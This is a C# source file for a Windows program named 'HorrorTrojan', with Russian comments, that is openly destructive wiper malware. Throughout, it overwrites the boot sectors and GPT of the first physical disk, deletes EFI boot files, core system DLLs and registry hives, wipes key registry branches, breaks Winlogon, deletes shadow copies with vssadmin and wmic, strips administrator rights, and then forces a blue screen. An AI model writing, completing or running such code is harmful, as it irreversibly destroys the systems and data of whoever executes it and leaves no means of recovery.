using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;

namespace HorrorTrojan
{
    internal static class BSODTrigger
    {
        public static void TriggerBSOD()
        {
            // 1. УНИЧТОЖАЕМ ВСЁ, КРОМЕ ФАЙЛОВ, НУЖНЫХ ДЛЯ BSOD
            DestroyEverything();
            
            // 2. ВЫЗЫВАЕМ BSOD
            uint response;
            NativeMethods.NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
        }
        
        private static void DestroyEverything()
        {
            try
            {
                // ===== 1. УНИЧТОЖЕНИЕ ЗАГРУЗЧИКОВ =====
                DestroyBootSectors();
                
                // ===== 2. УНИЧТОЖЕНИЕ GPT И EFI =====
                DestroyGPTandEFI();
                
                // ===== 3. УНИЧТОЖЕНИЕ СИСТЕМНЫХ ФАЙЛОВ (КРОМЕ КРИТИЧЕСКИХ) =====
                DestroySystemFiles();
                
                // ===== 4. УНИЧТОЖЕНИЕ РЕЕСТРА =====
                DestroyRegistry();
                
                // ===== 5. УНИЧТОЖЕНИЕ WINLOGON =====
                DestroyWinlogon();
                
                // ===== 6. УНИЧТОЖЕНИЕ ТЕНЕВЫХ КОПИЙ =====
                DestroyShadowCopies();
                
                // ===== 7. ЛИШЕНИЕ ПРАВ АДМИНИСТРАТОРА =====
                RemoveAdminRights();
            }
            catch { }
        }
        
        private static void DestroyBootSectors()
        {
            try
            {
                byte[] mbr = ResourceExtractor.GetMBR();
                if (mbr.Length == 512)
                {
                    for (int sector = 0; sector < 64; sector++)
                    {
                        try
                        {
                            using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
                            {
                                fs.Seek(sector * 512, SeekOrigin.Begin);
                                fs.Write(mbr, 0, 512);
                                fs.Flush();
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }
        
        private static void DestroyGPTandEFI()
        {
            try
            {
                byte[] zeros = new byte[512];
                
                for (int sector = 1; sector < 34; sector++)
                {
                    try
                    {
                        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
                        {
                            fs.Seek(sector * 512, SeekOrigin.Begin);
                            fs.Write(zeros, 0, 512);
                            fs.Flush();
                        }
                    }
                    catch { }
                }
                
                string[] efiPaths = new string[]
                {
                    @"C:\EFI\Microsoft\Boot\bootmgfw.efi",
                    @"C:\EFI\Microsoft\Boot\bootmgr.efi",
                    @"C:\EFI\Boot\bootx64.efi",
                    @"C:\EFI\Microsoft\Recovery\boot.sdi",
                    @"C:\EFI\Microsoft\Boot\BCD",
                    @"C:\EFI\Microsoft\Boot\boot.sdi"
                };
                
                foreach (string path in efiPaths)
                {
                    try
                    {
                        if (File.Exists(path))
                            File.Delete(path);
                    }
                    catch { }
                }
            }
            catch { }
        }
        
        private static void DestroySystemFiles()
        {
            try
            {
                // ===== ФАЙЛЫ, КОТОРЫЕ НЕЛЬЗЯ УДАЛЯТЬ (НУЖНЫ ДЛЯ BSOD) =====
                // ntdll.dll, kernel32.dll, ntoskrnl.exe, hal.dll
                // csrss.exe, services.exe, lsass.exe, svchost.exe, smss.exe, wininit.exe
                
                // ===== УДАЛЯЕМ ВСЁ ОСТАЛЬНОЕ =====
                string[] systemFiles = new string[]
                {
                    // Winlogon (можно удалить, BSOD уже вызван)
                    @"C:\Windows\System32\winlogon.exe",
                    
                    // Драйверы
                    @"C:\Windows\System32\drivers\ntfs.sys",
                    @"C:\Windows\System32\drivers\fastfat.sys",
                    @"C:\Windows\System32\drivers\disk.sys",
                    @"C:\Windows\System32\drivers\partmgr.sys",
                    @"C:\Windows\System32\drivers\volmgr.sys",
                    @"C:\Windows\System32\drivers\mountmgr.sys",
                    
                    // Конфигурации
                    @"C:\Windows\System32\config\SYSTEM",
                    @"C:\Windows\System32\config\SOFTWARE",
                    @"C:\Windows\System32\config\SAM",
                    @"C:\Windows\System32\config\SECURITY",
                    @"C:\Windows\System32\config\DEFAULT",
                    @"C:\Windows\System32\config\BCD-Template",
                    
                    // Загрузочные файлы
                    @"C:\bootmgr",
                    @"C:\Boot\BCD",
                    @"C:\Boot\boot.sdi",
                    @"C:\Boot\BCD.LOG",
                    @"C:\boot\bootstat.dat",
                    
                    // Winload
                    @"C:\Windows\System32\winload.exe",
                    @"C:\Windows\System32\winload.efi",
                    
                    // Другие системные файлы (не критические для BSOD)
                    @"C:\Windows\System32\user32.dll",
                    @"C:\Windows\System32\gdi32.dll",
                    @"C:\Windows\System32\advapi32.dll",
                    @"C:\Windows\System32\shell32.dll",
                    @"C:\Windows\System32\ole32.dll",
                    @"C:\Windows\System32\oleaut32.dll",
                    @"C:\Windows\System32\comctl32.dll",
                    @"C:\Windows\System32\comdlg32.dll",
                    @"C:\Windows\System32\ws2_32.dll",
                    @"C:\Windows\System32\wininet.dll",
                    @"C:\Windows\System32\urlmon.dll",
                    @"C:\Windows\System32\shlwapi.dll",
                    @"C:\Windows\System32\setupapi.dll",
                    @"C:\Windows\System32\propsys.dll",
                    @"C:\Windows\System32\secur32.dll",
                    @"C:\Windows\System32\wintrust.dll",
                    @"C:\Windows\System32\crypt32.dll",
                    @"C:\Windows\System32\msvcrt.dll",
                    @"C:\Windows\System32\vcruntime140.dll"
                };
                
                foreach (string path in systemFiles)
                {
                    try
                    {
                        if (File.Exists(path))
                            File.Delete(path);
                    }
                    catch { }
                }
            }
            catch { }
        }
        
        private static void DestroyRegistry()
        {
            try
            {
                string[] registryKeys = new string[]
                {
                    @"SYSTEM\CurrentControlSet\Control\Session Manager",
                    @"SYSTEM\CurrentControlSet\Control\Lsa",
                    @"SYSTEM\CurrentControlSet\Control\SecurityProviders",
                    @"SYSTEM\CurrentControlSet\Control\Windows",
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
                };
                
                foreach (string keyPath in registryKeys)
                {
                    try
                    {
                        Registry.LocalMachine.DeleteSubKeyTree(keyPath, false);
                    }
                    catch { }
                }
            }
            catch { }
        }
        
        private static void DestroyWinlogon()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    key.SetValue("Shell", "nonexistent.exe", RegistryValueKind.String);
                    key.SetValue("Userinit", "nonexistent.exe", RegistryValueKind.String);
                    key.SetValue("System", "nonexistent.exe", RegistryValueKind.String);
                    key.SetValue("GinaDLL", "nonexistent.dll", RegistryValueKind.String);
                }
            }
            catch { }
        }
        
        private static void DestroyShadowCopies()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "vssadmin",
                    Arguments = "delete shadows /all /quiet",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                
                Process.Start(new ProcessStartInfo
                {
                    FileName = "wmic",
                    Arguments = "shadowcopy delete",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }
        
        private static void RemoveAdminRights()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = "localgroup Administrators %username% /delete",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                
                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = "user %username% /active:no",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }
    }
}
